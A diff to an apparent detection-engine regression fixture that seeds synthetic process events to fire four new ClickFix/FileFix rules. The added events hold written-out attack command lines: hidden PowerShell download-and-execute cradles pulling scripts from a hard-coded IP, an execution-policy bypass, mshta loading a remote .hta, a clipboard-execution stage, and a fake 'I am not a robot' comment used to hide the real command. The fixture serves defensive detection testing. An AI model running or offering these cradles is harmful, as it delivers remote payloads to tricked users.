@@ -2,7 +2,7 @@
 """Seed one incident that exercises every rule in the corpus.
 
 seed_apt.py tells one attacker's story end to end. This script has a different
-job: it is a regression fixture and a coverage demo, built to fire all 103 rules
+job: it is a regression fixture and a coverage demo, built to fire all 107 rules
 -- across every EventID the engine understands (1, 2, 3, 6, 7, 8, 9, 10, 11,
 12, 13, 15, 17, 20, 22, 23, 25) plus a handful of EventIDs no rule keys on (18,
 19, 21) added purely so the incident's raw event stream and process tree show
@@ -77,6 +77,11 @@ machine. The phases, roughly in kill-chain order:
                       SYS-133, SYS-135, SYS-136, SYS-137, SYS-139, SYS-140,
                       SYS-141, SYS-142, SYS-144, SYS-148, SYS-150)
               └─ ftp.exe -s:script -> cmd.exe               (SYS-079)
+      ├─ coverage-expansion pass 5: ClickFix/FileFix, direct children of
+      │   explorer.exe rather than "ops" -- a decoy CAPTCHA-lure paste, a
+      │   bypass+hidden PowerShell cradle, mshta named straight in the Run
+      │   dialog, and a second-stage PowerShell that pulls its payload back
+      │   out of the clipboard (SYS-151 through SYS-154)
       ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
       ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
       ├─ w3wp.exe -> cmd.exe, appcmd.exe                     (SYS-088/038/039)
@@ -118,7 +123,8 @@ EXPECTED_RULES = {
     "SYS-121", "SYS-122", "SYS-123", "SYS-124", "SYS-125", "SYS-126", "SYS-127",
     "SYS-128", "SYS-129", "SYS-130", "SYS-131", "SYS-132", "SYS-133", "SYS-135",
     "SYS-136", "SYS-137", "SYS-138", "SYS-139", "SYS-140", "SYS-141", "SYS-142",
-    "SYS-143", "SYS-144", "SYS-148", "SYS-149", "SYS-150",
+    "SYS-143", "SYS-144", "SYS-148", "SYS-149", "SYS-150", "SYS-151", "SYS-152",
+    "SYS-153", "SYS-154",
 }
 
 
@@ -244,6 +250,11 @@ G = {
     "curl_upload": "{rng-curl-upload}",
     "sharphound_ps1": "{rng-sharphound-ps1}",
     "asrep_roast": "{rng-asrep-roast}",
+    # Coverage-expansion pass 5: ClickFix/FileFix (SYS-151 through SYS-154).
+    "clickfix_lure": "{rng-clickfix-lure}",
+    "clickfix_bypass": "{rng-clickfix-bypass}",
+    "clickfix_mshta": "{rng-clickfix-mshta}",
+    "clickfix_clip": "{rng-clickfix-clip}",
 }
 
 
@@ -778,6 +789,43 @@ def events() -> list[dict]:
     ev.append(proc(step(1), G["asrep_roast"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\GetNPUsers.py",
                     r"GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -no-pass",
                     pid=5550, ppid=4510, integrity="High"))
+
+    # === Coverage-expansion pass 5: ClickFix/FileFix, direct children of ===
+    # === explorer.exe -- the whole point of the technique is that a user  ===
+    # === pastes into the Run dialog, so explorer.exe is the real parent   ===
+    # === here rather than "ops" like every other LOLBAS branch above.     ===
+    #
+    # Decoy CAPTCHA-verification lure, padded with a `#` comment to push the
+    # real command off-screen (SYS-151), which also happens to satisfy the
+    # generic download-idiom rule (SYS-153) since it carries `iwr | iex`.
+    ev.append(proc(step(1), G["clickfix_lure"], G["root"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r'powershell -w hidden -c "iwr http://45.132.192.68/x.ps1|iex"'
+                    r"      # Verification ID: 8823-KLM - I am not a robot, please wait...",
+                    pid=5560, ppid=3120))
+
+    # Execution-policy bypass stacked with a hidden window, launched straight
+    # from Explorer (SYS-152) -- also a download cradle (SYS-153).
+    ev.append(proc(step(1), G["clickfix_bypass"], G["root"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r"powershell.exe -ep bypass -w hidden -c IEX(New-Object "
+                    r"Net.WebClient).DownloadString('http://45.132.192.68/stage2.ps1')",
+                    pid=5570, ppid=3120))
+
+    # mshta named directly in the Run dialog rather than typed by an admin
+    # (SYS-153) -- independently also satisfies SYS-100's URL check.
+    ev.append(proc(step(1), G["clickfix_mshta"], G["root"], r"C:\Windows\System32\mshta.exe",
+                    "mshta.exe http://45.132.192.68/payload.hta", pid=5580, ppid=3120))
+
+    # Second-stage PowerShell pulling the real payload back out of the
+    # clipboard rather than the Run-dialog command carrying it directly
+    # (SYS-154) -- parented at the bypass process above, not Explorer, since
+    # that is exactly the point the rule's own description makes: by this
+    # stage the parent is no longer Explorer.
+    ev.append(proc(step(1), G["clickfix_clip"], G["clickfix_bypass"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r'powershell -nop -c "iex (Get-Clipboard | Out-String)"',
+                    pid=5590, ppid=5570))
 
     # === FTP LOLBAS execution, off "ops" ===
     ev.append(proc(step(2), G["ftp"], G["ops"], r"C:\Windows\System32\ftp.exe",
